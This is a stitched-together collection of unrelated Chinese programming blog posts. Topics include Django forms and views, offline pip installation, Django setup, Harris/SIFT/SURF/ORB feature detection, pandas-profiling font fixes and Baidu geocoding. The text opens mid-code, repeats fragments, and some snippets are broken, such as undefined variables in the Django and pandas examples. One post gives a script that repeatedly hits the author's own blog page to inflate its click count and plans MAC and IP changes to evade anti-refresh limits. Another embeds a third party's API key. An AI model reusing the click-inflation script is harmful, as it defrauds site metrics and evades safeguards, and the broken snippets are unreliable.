    fout=open("mysite//test.txt","wt") 
    str = "hello world"
    fout.write(str)
    fout.close()     
    #response['Content-Disposition'] = 'attachment; filename=test.txt' 
    data = open("mysite//test.txt", "rb").read()

    html = '<html><body>%s</body></html>' %str
    return HttpResponse(data, content_type="text/plain")
    


 参考文献：

http://blog.chedushi.com/archives/7538


﻿﻿
﻿﻿







上面是没有调用cleaned_data的提交结果，可见模版直接把form里面的整个标签都接收过来了



下面是调用cleaned_data 的结果






django 的表单，提交上来之后是这样的：
#coding： gb2312
from django import forms

class ContactForm(forms.Form):
    subject = forms.CharField(max_length=10,label='subject')#设置最大长度为10
    email = forms.EmailField(required=False,label='Email')#非必要字段
    message = forms.CharField(widget=forms.Textarea,label='message')#指定form中组件的类型

    #自定义校验规则，该方法在校验时被系统自动调用，次序在“字段约束”之后
    def clean_message(self):
        message = self.cleaned_data['message']#能到此处说明数据符合“字段约束”要求
        num_words = len(message.split())
        if num_words < 1:#单词个数
            raise forms.ValidationError("your word is too short!")
        return message

比如下面这句：

email = forms.EmailField(required=False,label='Email')#非必要字段
其实可以作为非必要字段，required=False

由于调用form.cleaned_data#只有各个字段都符合要求时才有对应的cleaned_data，之前好像必须得：
if form.is_valid():#说明各个字段的输入值都符合要求
所以上述字段required=False，在测试东西或者自己写东西，等安全性不高的场合就比较必要了

#coding： gb2312
from django.http import HttpResponse
import datetime,calendar
import time
from django.http import HttpResponse
from django.template import Context
from django.template.loader import get_template
from django.http import HttpResponse, Http404
from django.contrib.auth.models import User
from django.shortcuts import render_to_response
from django.http import HttpResponseRedirect
from django.contrib.auth import logout
from django.template import RequestContext
from django.core.urlresolvers import reverse
from django.shortcuts import redirect

#from django import form

from django.shortcuts import render 
from .forms import ContactForm 
#from django.shortcuts import render_to_response
#from django_manage_app.forms import ContactForm

def current_datetime(request):
    now = time.strftime('%Y-%m-%d-%H-%M-%S',time.localtime(time.time()))
    html = '<html><body>It is now %s.</body></html>' %now
    return HttpResponse(html)
    
def show_readme(request):
    if request.method == 'POST':#提交请求时才会访问这一段，首次访问页面时不会执行
        form = ContactForm(request.POST)
    
       
    print (form['subject'])
    print (form['email'])
    print (form['message'])
    print ("show ----------------")
     
    
    #“首次访问”和“提交的信息不符合要求”时被调用
    return render_to_response('show.html', {'form': form})
    
    
def contact_author(request):
    if request.method == 'POST':#提交请求时才会访问这一段，首次访问页面时不会执行
        form = ContactForm(request.POST)
        if form.is_valid():#说明各个字段的输入值都符合要求
            cd = form.cleaned_data#只有各个字段都符合要求时才有对应的cleaned_data
            #print (form.cleaned_data())
            
            print (cd['subject'])
            print (cd['email'])
            print (cd['message'])
            #return render_to_response('contact_author.html', {'form': form})
            #return redirect(reverse('','show_readme.html'))
            #return HttpResponseRedirect('/thanks/') 
            return render_to_response('show_readme.html', {'form': cd})
            #此处逻辑应该是先生成新的预览页面，再保存为txt
            
            #return response
            
        
    else:#首次访问该url时没有post任何表单
        form = ContactForm()#第一次生成的form里面内容的格式
        print (form)
        print (form.is_valid())
    
    #“首次访问”和“提交的信息不符合要求”时被调用
    return render_to_response('contact_author.html', {'form': form})
    #return render_to_response('show.html', {'form': form})



def thanks(request):

    return render_to_response('thanks.html')
    
    
def download_file(request):   
    #from django.http import HttpResponse          
    ## CSV  
    #import csv      
    #response = HttpResponse(mimetype='text/csv')  
    #response['Content-Disposition'] = 'attachment; filename=my.csv'  
    #writer = csv.writer(response)  
    #writer.writerow(['First row', 'Foo', 'Bar', 'Baz'])  
    #writer.writerow(['Second row', 'A', 'B', 'C', '"Testing"', "Here's a quote"])  
 
    # Text file  
    response = HttpResponse(content_type='text/plain')                                
    response['Content-Disposition'] = 'attachment; filename=my.txt'                
    response.write("aa\n")  
    response.write("bb")   
     
    # PDF file   
    #http://code.djangoproject.com/svn/django/branches/0.95-bugfixes/docs/outputting_pdf.txt  
    #from reportlab.pdfgen import canvas  #need pip ind
    #response = HttpResponse()#)mimetype='application/pdf')  
    #response['Content-Disposition'] = 'attachment; filename=somefilename.pdf'  
    #p = canvas.Canvas(response)  
    #p.drawString(100, 100, "Hello world.")  
    #p.showPage()  
    #p.save()  
    
    
    #response = HttpResponse()
    fout=open("mysite//test.txt","wt") 
    str = "hello world"
    fout.write(str)
    fout.close()     
    #response['Content-Disposition'] = 'attachment; filename=test.txt' 
    data = open("mysite//test.txt", "rb").read()

    html = '<html><body>%s</body></html>' %str
    return response#HttpResponse(data, content_type="text/plain")
    



提交给模版的html：

<html>
<style type="text/css">
    
    .field{
        background-color:#BCD8F5;
    }
</style>
<head>
    <title>show readme</title>
</head>
<body>

    
    
        <!<div class="field">
	
             {{ form.subject }}
             {{ form.email }}
             {{ form.message }}
            
        <!</div>
        
   
</body>
</html>


Django本身内建有一些app，例如注释系统和自动管理界面。 
app的一个关键点是它们是很容易移植到其他project和被多个project复用。
对于如何架构Django代码并没有快速成套的规则。
如果你只是建造一个简单的Web站点，那么可能你只需要一个app就可以了；
但如果是一个包含许多不相关的模块的复杂的网站，
例如电子商务和社区之类的站点，那么你可能需要把这些模块划分成不同的app，以便以后复用。
 
 数据库模型有有效性验证
C:\Python27\Lib\site-packages\Django-1.7.1-py2.7.egg\django\bin\mysite>python manage.py sqlall books
CommandError: App 'books' has migrations. Only the sqlmigrate and sqlflush commands can be used when an app has migrations.
此时需要输入如下部分即可
C:\Python27\Lib\site-packages\Django-1.7.1-py2.7.egg\django\bin\mysite>python manage.py makemigrations
C:\Python27\Lib\site-packages\Django-1.7.1-py2.7.egg\django\bin\mysite>python manage.py migrate

若上述问题依旧：
Since there is still a bit of backwards compatibility with django 1.6 and below you can still use the sql commands from django-admin. However, you have to delete the migrations folder first.
To get the create statements you need to remove the migrations folder
直接删除books app下面的migrations文件夹



﻿﻿
﻿﻿









0. 绪论
断网的环境下配置python开发环境非常讨厌，本文旨在优雅暴力的解决这一问题。

生产环境 ： 
  windows 7 windows10 
  python 3.5.2 
  pip 1.5.2

友情提示：出现问题时候，看日志是王道！计算机不会犯错！
机器上python2，3混用的问题，参考： 
http://blog.csdn.net/wangyaninglm/article/details/53312606 
第二小节：不同版本python混用（官方用法）其实主要就是前面加上py -3(或)2
Windows离线断网环境下安装Python包，配置环境，准备用来生成word模版，需要用到一些win32com的python库，但是又没有网还想用pip方式傻瓜安装，怎么办呢，百度google探索了半天。姑且记录一下 
linux下此方法应该同样可行。
当然还有暴力的方法是，pip show 包名，然后python的版本一样的话直接copy目录（红线部分），import应该也是好使的。下面以numpy包为例。


1.安装过程
1.下载最新pip，更新pip版本
新建packages文件夹放在目录中：c:\python35\packages
py -3 –m pip install --upgrade pip
2.在可以联网的开发机器上安装好需要的包 
例如：

py -3 –m pip install numpy 
  py -3 –m pip install pandas

3.打包已安装的包
在c:\python35目录下新建packages文件夹用来存储下载下来的所需安装包。 
在 c:\python35\Scripts下启动cmd窗口。
pip list #查看安装的包
pip freeze >requirements.txt
py -3 –m pip install --download c:\python35\packages -r requirements.txt
上述命令需要在一个联网机器上运行，不然会报错，不联网的机器似乎没法打包已经安装好的whl包，如果有方法求高手告知，报错如下（白色字体是联网后运行正常的）： 

requirements.txt是这个样子：大概记载了每个包的版本号

cycler==0.10.0 
  jieba==0.38 
  matplotlib==1.5.3 
  nltk==3.2.1 
  numpy==1.11.2 
  pyparsing==2.1.10 
  python-dateutil==2.6.0 
  pytz==2016.10 
  scikit-learn==0.18.1 
  six==1.10.0

4.离线情况安装其他机器打包好的包whl
将packages文件夹和requirement.txt拷贝至离线机器上目录下， 
packages文件夹放在c:\Python35下，requirement.txt放在c:\Python35\Scripts下。 
requirements.txt文件放在pip.exe目录下。
py -3 –m pip install --no-index --find-index=c:\python35\packages -r requirements.txt
上述命令中的–find-index 这个命令在python27中似乎是对的，python35中需要换成–find-links

正确的命令：
py -3 -m pip install --no-index --find-links=c:\python35\packages -r requirements.txt
3.原理

这种whl包下载好后，放在上述位置，再修改下面文件 

添加一行：

包名=版本号

来一个命令就行了！装过的pip就不装了，没装的pip会自动安装

py -3 -m pip install –no-index –find-links=c:\python35\packages -r requirements.txt


参考
https://segmentfault.com/a/1190000006027207
pip常用命令： 
http://me.iblogc.com/2015/01/01/pip%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/
pip documentation： 
https://pip.pypa.io/en/latest/ 








1.python 的安装

网上很多关于django跟python 开发的资料，这块我正在实习准备用这个两个合起来搞一个基于web 的东西出来现在开始学习，写点东西记录一下心得。

开发环境是windows的，所以我们到python官网下载64位的windows操作系统的安装包：

https://www.python.org/ftp/python/3.4.3/python-3.4.3.amd64.msi

这个版本直接添加了系统的环境变量非常的方面（吐槽一下各种开发环境环境变量的配置）。

2.Django的安装

下面安装Django:没错不知道大家有没有看过《被解救的姜戈》

https://www.djangoproject.com/download/1.8/tarball/

下载下来是.tar.gz的，可以用7z解压一下，这里推荐一下7z这款免费的解压缩软件。
7z：
http://downloads.sourceforge.net/sevenzip/7z920-x64.msi

进入到解压好的目录：一条命令搞定安装

pythonsetup.py
install

看看安装好了没：

import django
django.VERSION

之后有版本信息就算是安装好了

数据库什么的绑定工作我们暂时先不做，这个版本的python默认是自带SQLite 的所以，基本够用了。



3.搭建一个显示时间的project

打开cmd，搞到一个目录里面，随便什么目录：
django-admin startproject 
projectname

 startproject 都创建了哪些内容：
mysite/
    __init__.py
    manage.py
    settings.py
    urls.py
包括下列这些文件：
__init__.py ：让 Python 把该目录当成一个开发包 (即一组模块)所需的文件。
manage.py ：一种命令行工具，可让你以多种方式与该 Django 项目进行交互。
settings.py ：该 Django 项目的设置或配置。
urls.py ：该 Django 项目的 URL 声明，即 Django 所支撑站点的内容列表


在mysite目录（projectname）下新建一个views.py

from django.http import HttpResponse
import datetime,calendar
import time


def current_datetime(request):
	now = time.strftime('%Y-%m-%d-%H-%M-%S',time.localtime(time.time()))
	html = "<html><body>It is now %s.</body></html>" %now
	return HttpResponse(html)

修改uls.py为：

from django.conf.urls import patterns, include, url
from django.contrib import admin
from mysite.views import current_datetime

urlpatterns = patterns('',
    # Examples:
    # url(r'^$', 'mysite.views.home', name='home'),
    # url(r'^blog/', include('blog.urls')),

    #url(r'^admin/', include(admin.site.urls)),
	(r'^time/$',current_datetime),
)



进入projectname 文件夹其中，并运行 
python manage.py runserver 命令


参考文献：
IBM的一个知识库：
http://www.ibm.com/developerworks/cn/linux/l-django/
djangobook在线版本：（上面有的代码有错误，需要大家具有一点调试技巧的）
http://docs.30c.org/djangobook2/

django官方文档：
http://django-chinese-docs.readthedocs.org/en/latest/
﻿﻿
﻿﻿
﻿﻿









1.Harris角点检测
Harris角点检测算法是一个极为简单的角点检测算法，该算法在1988年就被发明了，算法的主要思想是如果像素周围显示存在多于一个方向的边，我们认为该点为兴趣点。基本原理是根据公式： 
 
化简为求解矩阵，最后根据矩阵的特征值判断是否为角点 
 
 
实现效果： 
 
代码（不用OpenCV）：

# -*- coding: utf-8 -*-
from pylab import *
from PIL import Image
from numpy import *
from scipy.ndimage import filters

print 'hello'

def compute_harris_response(im,sigma=3):
    """ Compute the Harris corner detector response function 
        for each pixel in a graylevel image. """

    # derivatives
    imx = zeros(im.shape)
    filters.gaussian_filter(im, (sigma,sigma), (0,1), imx)
    imy = zeros(im.shape)
    filters.gaussian_filter(im, (sigma,sigma), (1,0), imy)

    # compute components of the Harris matrix
    Wxx = filters.gaussian_filter(imx*imx,sigma)
    Wxy = filters.gaussian_filter(imx*imy,sigma)
    Wyy = filters.gaussian_filter(imy*imy,sigma)

    # determinant and trace
    Wdet = Wxx*Wyy - Wxy**2
    Wtr = Wxx + Wyy

    return Wdet / Wtr


def get_harris_points(harrisim,min_dist=10,threshold=0.1):
    """ Return corners from a Harris response image
        min_dist is the minimum number of pixels separating 
        corners and image boundary. """

    # find top corner candidates above a threshold
    corner_threshold = harrisim.max() * threshold
    harrisim_t = (harrisim > corner_threshold) * 1

    # get coordinates of candidates
    coords = array(harrisim_t.nonzero()).T

    # ...and their values
    candidate_values = [harrisim[c[0],c[1]] for c in coords]

    # sort candidates (reverse to get descending order)
    index = argsort(candidate_values)[::-1]

    # store allowed point locations in array
    allowed_locations = zeros(harrisim.shape)
    allowed_locations[min_dist:-min_dist,min_dist:-min_dist] = 1

    # select the best points taking min_distance into account
    filtered_coords = []
    for i in index:
        if allowed_locations[coords[i,0],coords[i,1]] == 1:
            filtered_coords.append(coords[i])
            allowed_locations[(coords[i,0]-min_dist):(coords[i,0]+min_dist), 
                        (coords[i,1]-min_dist):(coords[i,1]+min_dist)] = 0

    return filtered_coords


def plot_harris_points(image,filtered_coords):
    """ Plots corners found in image. """

    figure()
    gray()
    imshow(image)
    plot([p[1] for p in filtered_coords],
                [p[0] for p in filtered_coords],'*')
    axis('off')
    show()


def get_descriptors(image,filtered_coords,wid=5):
    """ For each point return pixel values around the point
        using a neighbourhood of width 2*wid+1. (Assume points are 
        extracted with min_distance > wid). """

    desc = []
    for coords in filtered_coords:
        patch = image[coords[0]-wid:coords[0]+wid+1,
                            coords[1]-wid:coords[1]+wid+1].flatten()
        desc.append(patch)

    return desc


def match(desc1,desc2,threshold=0.5):
    """ For each corner point descriptor in the first image, 
        select its match to second image using
        normalized cross correlation. """

    n = len(desc1[0])

    # pair-wise distances
    d = -ones((len(desc1),len(desc2)))
    for i in range(len(desc1)):
        for j in range(len(desc2)):
            d1 = (desc1[i] - mean(desc1[i])) / std(desc1[i])
            d2 = (desc2[j] - mean(desc2[j])) / std(desc2[j])
            ncc_value = sum(d1 * d2) / (n-1) 
            if ncc_value > threshold:
                d[i,j] = ncc_value

    ndx = argsort(-d)
    matchscores = ndx[:,0]

    return matchscores


def match_twosided(desc1,desc2,threshold=0.5):
    """ Two-sided symmetric version of match(). """

    matches_12 = match(desc1,desc2,threshold)
    matches_21 = match(desc2,desc1,threshold)

    ndx_12 = where(matches_12 >= 0)[0]

    # remove matches that are not symmetric
    for n in ndx_12:
        if matches_21[matches_12[n]] != n:
            matches_12[n] = -1

    return matches_12


def appendimages(im1,im2):
    """ Return a new image that appends the two images side-by-side. """

    # select the image with the fewest rows and fill in enough empty rows
    rows1 = im1.shape[0]    
    rows2 = im2.shape[0]

    if rows1 < rows2:
        im1 = concatenate((im1,zeros((rows2-rows1,im1.shape[1]))),axis=0)
    elif rows1 > rows2:
        im2 = concatenate((im2,zeros((rows1-rows2,im2.shape[1]))),axis=0)
    # if none of these cases they are equal, no filling needed.

    return concatenate((im1,im2), axis=1)


def plot_matches(im1,im2,locs1,locs2,matchscores,show_below=True):
    """ Show a figure with lines joining the accepted matches 
        input: im1,im2 (images as arrays), locs1,locs2 (feature locations), 
        matchscores (as output from 'match()'), 
        show_below (if images should be shown below matches). """

    im3 = appendimages(im1,im2)
    if show_below:
        im3 = vstack((im3,im3))

    imshow(im3)

    cols1 = im1.shape[1]
    for i,m in enumerate(matchscores):
        if m>0:
            plot([locs1[i][1],locs2[m][1]+cols1],[locs1[i][0],locs2[m][0]],'c')
    axis('off')

def imresize(im,sz):
    """    Resize an image array using PIL. """
    pil_im = Image.fromarray(uint8(im))

    return array(pil_im.resize(sz))
"""
Example of detecting Harris corner points (Figure 2-1 in the book).
"""

# 读入图像
im = array(Image.open('swan.jpg').convert('L'))

# 检测harris角点
harrisim = compute_harris_response(im)

# Harris响应函数
harrisim1 = 255 - harrisim

figure()
gray()

#画出Harris响应图
subplot(141)
imshow(harrisim1)
print harrisim1.shape
axis('off')
axis('equal')


threshold = [0.01, 0.05, 0.1]
for i, thres in enumerate(threshold):
    filtered_coords = get_harris_points(harrisim, 6, thres)
    subplot(1, 4, i+2)
    imshow(im)
    print im.shape
    plot([p[1] for p in filtered_coords], [p[0] for p in filtered_coords], '*')
    axis('off')

#原书采用的PCV中PCV harris模块
#harris.plot_harris_points(im, filtered_coords)

# plot only 200 strongest
# harris.plot_harris_points(im, filtered_coords[:200])


# Figure 2-2下面的图
im1 = array(Image.open("swan.jpg").convert("L"))
im2 = array(Image.open("swan.jpg").convert("L"))
# resize to make matching faster
im1 = imresize(im1, (im1.shape[1]/2, im1.shape[0]/2))
im2 = imresize(im2, (im2.shape[1]/2, im2.shape[0]/2))

wid = 5
harrisim = compute_harris_response(im1, 5)
filtered_coords1 = get_harris_points(harrisim, wid+1)
d1 = get_descriptors(im1, filtered_coords1, wid)

harrisim = compute_harris_response(im2, 5)
filtered_coords2 = get_harris_points(harrisim, wid+1)
d2 = get_descriptors(im2, filtered_coords2, wid)

print 'starting matching'
matches = match_twosided(d1, d2)

figure()
gray() 
plot_matches(im1, im2, filtered_coords1, filtered_coords2, matches)
show()


OpenCV函数cv2.cornerHarris() 有四个参数 其作用分别为 :
img - Input image, it should be grayscale and float32 type. 
blockSize - It is the size of neighbourhood considered for corner detection 
ksize - Aperture parameter of Sobel derivative used. 
k - Harris detector free parameter in the equation.
当然可以使用OpenCV在亚像素上提高算法的精度，使用函数cv2.cornerSubPix()，不过应该使用最新版的OpenCV 我电脑上是2.4.9版本，好像文档[2]中的代码没有调试通过， 
下面是OpenCV代码的效果： 

代码：
# -*- coding: utf-8 -*-
"""
Created on Sat Jun 11 23:21:18 2016

@author: season
"""

import cv2
import numpy as np


filename = 'swan.jpg'
img = cv2.imread(filename)
gray = cv2.cvtColor(img,cv2.COLOR_BGR2GRAY)

gray = np.float32(gray)
dst = cv2.cornerHarris(gray,2,3,0.04)

#result is dilated for marking the corners, not important
dst = cv2.dilate(dst,None)

# Threshold for an optimal value, it may vary depending on the image.
img[dst>0.01*dst.max()]=[0,0,255]

cv2.imshow('dst',img)
if cv2.waitKey(0) & 0xff == 27:
    cv2.destroyAllWindows()
测试OpenCV，numpy模块的代码：
#test cv2 and numpy package
print cv2.__version__
a = np.arange(10)
print(a)
2.sift特征
在Harris角点中对于下图所示的特征，小窗口中可能认为是角点，当窗口尺寸变化，则可能检测不到角点。 
 
2004年提出的Scale Invariant Feature Transform (SIFT) 是改进的基于尺度不变的特征检测器。
SIFT特征包括兴趣点检测器和描述子，它对于尺度，旋转和亮度都具有不变性。
有下面四个步骤 
1. Scale-space Extrema Detection 
2. Keypoint Localization 
3. Orientation Assignment 
4. Keypoint Descriptor 
5. Keypoint Matching
sift特征点检测效果： 
 
sift的OpenCV代码比较简单：
# -*- coding: utf-8 -*-
"""
Created on Sat Jun 11 20:22:51 2016

@author: season
"""

import cv2

import numpy as np
#import pdb
#pdb.set_trace()#turn on the pdb prompt

#test cv2 and numpy package
print cv2.__version__
a = np.arange(10)
print(a)

img = cv2.imread('swan.jpg')
gray= cv2.cvtColor(img,cv2.COLOR_BGR2GRAY)

sift = cv2.SIFT()
kp = sift.detect(gray,None)

img=cv2.drawKeypoints(gray,kp)

cv2.imwrite('sift_keypoints.jpg',img)
cv2.imshow("sift_keypoint",img)
cv2.waitKey(0)
cv2.destroyAllWindows()
3.SURF特征点
In 2006, three people, Bay, H., Tuytelaars, T. and Van Gool, L, published another paper, “SURF: Speeded Up Robust Features” which introduced a new algorithm called SURF. As name suggests, it is a speeded-up version of SIFT. 
 在SURF算法中，特征点的判据为某像素亮度的Hessian矩阵的行列式(Dxx*Dyy-Dxy*Dxy)为一个极值。由于Hessian矩阵的计算需要用到偏导数的计算，这一般通过像素点亮度值与高斯核的某一方向偏导数卷积而成；在SURF算法里，为提高算法运行速度，在精度影响很小的情况下，用近似的盒状滤波器（0，1，1组成的box filter）代替高斯核。因为滤波器仅有0，-1,1，因此卷积的计算可以用积分图像（Integral image）来优化（O(1)的时间复杂度），大大提高了效率。 
 Surf在速度上比sift要快许多，这主要得益于它的积分图技术，已经Hessian矩阵的利用减少了降采样过程，另外它得到的特征向量维数也比较少，有利于更快的进行特征点匹配。
基于surf的人脸识别：
# -*- coding: utf-8 -*-
"""
Created on Wed Jun 15 22:05:44 2016

@author: Administrator
"""
import cv2


import numpy

opencv_haystack =cv2.imread('woman.jpg')
opencv_needle =cv2.imread('face.jpg')

ngrey = cv2.cvtColor(opencv_needle, cv2.COLOR_BGR2GRAY)
hgrey = cv2.cvtColor(opencv_haystack, cv2.COLOR_BGR2GRAY)

# build feature detector and descriptor extractor
hessian_threshold = 85
detector = cv2.SURF(hessian_threshold)
(hkeypoints, hdescriptors) = detector.detect(hgrey, None, useProvidedKeypoints = False)
(nkeypoints, ndescriptors) = detector.detect(ngrey, None, useProvidedKeypoints = False)

# extract vectors of size 64 from raw descriptors numpy arrays
rowsize = len(hdescriptors) / len(hkeypoints)
if rowsize > 1:
    hrows = numpy.array(hdescriptors, dtype = numpy.float32).reshape((-1, rowsize))
    nrows = numpy.array(ndescriptors, dtype = numpy.float32).reshape((-1, rowsize))
    #print hrows.shape, nrows.shape
else:
    hrows = numpy.array(hdescriptors, dtype = numpy.float32)
    nrows = numpy.array(ndescriptors, dtype = numpy.float32)
    rowsize = len(hrows[0])

# kNN training - learn mapping from hrow to hkeypoints index
samples = hrows
responses = numpy.arange(len(hkeypoints), dtype = numpy.float32)
#print len(samples), len(responses)
knn = cv2.KNearest()
knn.train(samples,responses)

# retrieve index and value through enumeration
count = 1

for i, descriptor in enumerate(nrows):
    descriptor = numpy.array(descriptor, dtype = numpy.float32).reshape((1, rowsize))
    #print i, descriptor.shape, samples[0].shape
    retval, results, neigh_resp, dists = knn.find_nearest(descriptor, 1)
    res, dist =  int(results[0][0]), dists[0][0]
    #print res, dist

    if dist < 0.1:
        count = count+1
        # draw matched keypoints in red color
        color = (0, 0, 255)
#    else:
#        # draw unmatched in blue color
#        color = (255, 0, 0)
    # draw matched key points on haystack image
        x,y = hkeypoints[res].pt
        center = (int(x),int(y))
        cv2.circle(opencv_haystack,center,2,color,-1)
        # draw matched key points on needle image
        x,y = nkeypoints[i].pt
        center = (int(x),int(y))
        cv2.circle(opencv_needle,center,2,color,-1)


cv2.imshow("Input Image", opencv_haystack)
cv2.waitKey(0)
cv2.imshow("The match Result", opencv_needle)
cv2.waitKey(0)

print count
if count>40:
    print "Yes Success!"
else:
    print "False Face!"
#cv2.waitKey(0)
#cv2.destroyAllWindows()
4.ORB特征
一种新的具有局部不变性的特征 —— ORB特征，从它的名字中可以看出它是对FAST特征点与BREIF特征描述子的一种结合与改进，这个算法是由Ethan Rublee,Vincent Rabaud,Kurt Konolige以及Gary R.Bradski在2011年一篇名为“ORB：An Efficient Alternative to SIFT or SURF”的文章中提出。就像文章题目所写一样，ORB是除了SIFT与SURF外一个很好的选择，而且它有很高的效率，最重要的一点是它是免费的，SIFT与SURF都是有专利的，你如果在商业软件中使用，需要购买许可。
实现效果： 

代码：
# -*- coding: utf-8 -*-
"""
Created on Thu Jun 16 11:11:18 2016

@author: Administrator
"""

import numpy as np
import cv2
#from matplotlib import pyplot as plt
print cv2.__version__


img1 = cv2.imread('woman.jpg',0)          # queryImage
img2 = cv2.imread('face.jpg',0) # trainImage
def drawMatches(img1, kp1, img2, kp2, matches):
    """
    My own implementation of cv2.drawMatches as OpenCV 2.4.9
    does not have this function available but it's supported in
    OpenCV 3.0.0

    This function takes in two images with their associated 
    keypoints, as well as a list of DMatch data structure (matches) 
    that contains which keypoints matched in which images.

    An image will be produced where a montage is shown with
    the first image followed by the second image beside it.

    Keypoints are delineated with circles, while lines are connected
    between matching keypoints.

    img1,img2 - Grayscale images
    kp1,kp2 - Detected list of keypoints through any of the OpenCV keypoint 
              detection algorithms
    matches - A list of matches of corresponding keypoints through any
              OpenCV keypoint matching algorithm
    """

    # Create a new output image that concatenates the two images together
    # (a.k.a) a montage
    rows1 = img1.shape[0]
    cols1 = img1.shape[1]
    rows2 = img2.shape[0]
    cols2 = img2.shape[1]

    out = np.zeros((max([rows1,rows2]),cols1+cols2,3), dtype='uint8')

    # Place the first image to the left
    out[:rows1,:cols1] = np.dstack([img1, img1, img1])

    # Place the next image to the right of it
    out[:rows2,cols1:] = np.dstack([img2, img2, img2])

    # For each pair of points we have between both images
    # draw circles, then connect a line between them
    for mat in matches:

        # Get the matching keypoints for each of the images
        img1_idx = mat.queryIdx
        img2_idx = mat.trainIdx

        # x - columns
        # y - rows
        (x1,y1) = kp1[img1_idx].pt
        (x2,y2) = kp2[img2_idx].pt

        # Draw a small circle at both co-ordinates
        # radius 4
        # colour blue
        # thickness = 1
        cv2.circle(out, (int(x1),int(y1)), 4, (255, 0, 0), 1)   
        cv2.circle(out, (int(x2)+cols1,int(y2)), 4, (255, 0, 0), 1)

        # Draw a line in between the two points
        # thickness = 1
        # colour blue
        cv2.line(out, (int(x1),int(y1)), (int(x2)+cols1,int(y2)), (255, 0, 0), 1)


    # Show the image
    cv2.imshow('Matched Features', out)
    cv2.waitKey(0)
    cv2.destroyWindow('Matched Features')

    # Also return the image if you'd like a copy
    return out

# Initiate SIFT detector
orb = cv2.ORB()

# find the keypoints and descriptors with SIFT
kp1, des1 = orb.detectAndCompute(img1,None)
kp2, des2 = orb.detectAndCompute(img2,None)
# create BFMatcher object
bf = cv2.BFMatcher(cv2.NORM_HAMMING, crossCheck=True)

# Match descriptors.
matches = bf.match(des1,des2)

# Sort them in the order of their distance.
matches = sorted(matches, key = lambda x:x.distance)

# Draw first 10 matches.
img3 = drawMatches(img1,kp1,img2,kp2,matches[:10])

cv2.imshow('dst',img3)
if cv2.waitKey(0) & 0xff == 27:
    cv2.destroyAllWindows()
#plt.imshow(img3),plt.show()


'''
draw match 函数在下面的链接中有自己的实现，我直接复制过来了

http://stackoverflow.com/questions/20259025/module-object-has-no-attribute-drawmatches-opencv-python
'''
未完待续
参考文献
[1]http://opencv-python-tutroals.readthedocs.io/en/latest/py_tutorials/py_feature2d/py_table_of_contents_feature2d/py_table_of_contents_feature2d.html 
[2]http://opencv-python-tutroals.readthedocs.io/en/latest/py_tutorials/py_feature2d/py_features_harris/py_features_harris.html#exercises 









文章大纲1. 探索性数据分析代码样例效果解决pandas profile 中文显示的问题

1. 探索性数据分析
数据的筛选、重组、结构化、预处理等都属于探索性数据分析的范畴，探索性数据分析是帮助数据分析师掌握数据结构的重要工具，也是奠定后续工作的成功基石。
在数据的分析项目中，数据的收集和预处理往往占据整个项目工作量的十之八九，正式这些简单的工作决定了整个项目的成败。

Generates profile reports from a pandas DataFrame. The pandas df.describe() function is great but a little basic for serious exploratory data analysis. pandas_profiling extends the pandas DataFrame with df.profile_report() for quick data analysis.
For each column the following statistics - if relevant for the column type - are presented in an interactive HTML report:
Essentials: type, unique values, missing values
Quantile statistics like minimum value, Q1, median, Q3, maximum, range, interquartile range
Descriptive statistics like mean, mode, standard deviation, sum, median absolute deviation, coefficient of variation, kurtosis, skewness
Most frequent values
Histogram
Correlations highlighting of highly correlated variables, Spearman, Pearson and Kendall matrices
Missing values matrix, count, heatmap and dendrogram of missing values
官网：https://github.com/pandas-profiling/pandas-profiling

代码样例
一个完整的样例：
https://nbviewer.jupyter.org/github/lksfr/TowardsDataScience/blob/master/pandas-profiling.ipynb
# importing required packages
import pandas as pd
import pandas_profiling
import numpy as np


# importing the data
df = pd.read_csv('/Users/lukas/Downloads/titanic/train.csv')

profile = pandas_profiling.ProfileReport(tijian_pdf)
profile.to_file("output_tijian_chinese.html")


效果
样例链接：https://pandas-profiling.github.io/pandas-profiling/examples/meteorites/meteorites_report.html

在使用过程中发现，中文显示有问题，下面这块应该是调用seaborn 完成的。我们从源码配置文件可以看到


解决pandas profile 中文显示的问题
我们找到 pandas porfile 的配置文件，在conda 的环境中：
路径为：
D:\ProgramData\Anaconda3\envs\DATABASE\Lib\site-packages\pandas_profiling\view


打开文件看到：
## Credits for this style go to the ggplot and seaborn packages.
##   I copied the style file to remove dependencies on the Seaborn package.
##   Check it out, it's an awesome library for plotting!

其实设置是参照seaborn ，但是pandas profile 的绘图设置是独立于seaborn 的。
所以在字体设置（篮筐处），加上一个汉语字体，其他的字体干掉，注意前后空格，ok。

以防万一，把字体文件在这个目录再放一份

打完收工！
思路参考：
以 matplotlib 为基础的库的可视化库的中文显示问题，都可以这么设置








 
 
#A Auto-Visit Web Site Tool
import urllib
import time
import random
print "Auto Click the WebPage for Click-Num..."
for i in range(30):
    fs = urllib.urlopen(r'http://blog.csdn.net/wangyaninglm/article/details/7243970')
    print 'The ', i, 'time click done...'
    time.sleep(int(random.uniform(10, 25)))
print 'Auto Click WebPage Done...'

Auto Click the WebPage for Click-Num...
The  0 time click done...
The  1 time click done...
The  2 time click done...
The  3 time click done...
The  4 time click done...
The  5 time click done...
The  6 time click done...
The  7 time click done...
 
但是如果网站记录ip地址防止刷呢？学校的网络又是根据，mac来分配地址的
所以要调用python执行一些脚本，更改mac地址，释放ip，重新获取，刷新dns
 
待续。。。









文章大纲1. 正逆地理编码1.1 百度地图api正逆地理编码存在偏差1.1.1 百度地图 python地理位置编码1.1.2 百度地图 python逆地理位置编码1.2 高德地图接口2. 坐标系2.1 我们常说的坐标系2.2 坐标转码关键代码3. geohash3.1 python3 使用 geohash3.2 获取包围盒4.测试geohash查询接口5.结构化数据的处理入库部分参考文献


最近想做一个简单的地理位置分析，比如获取一些城市公交站点对应的geohash，geohash其实是将平时常见的经纬度进行了降维，这样可以进行类似附近的餐馆等内容的分析。

1. 正逆地理编码
http://lbsyun.baidu.com/index.php?title=webapi/guide/webservice-geocoding
正/逆地理编码服务（又名Geocoding API）是一类Web API接口服务；
正向地理编码服务提供将结构化地址数据（如：北京市海淀区上地十街十号）转换为对应坐标点（经纬度）功能；
逆向地理编码服务提供将坐标点（经纬度）转换为对应位置信息（如所在行政区划，周边地标点分布）功能。
1.1 百度地图api正逆地理编码存在偏差
百度地图坐标拾取
http://api.map.baidu.com/lbsapi/getpoint/index.html


可以直接使用的百度url：后面直接跟地址就好如上图（key不知道是谁的），可以发现百度的搜索分词权重直接把雍和宫地铁站定位到了雍和宫，
http://api.map.baidu.com/geocoder?key=f247cdb592eb43ebac6ccd27f796e2d2&output=json&address=
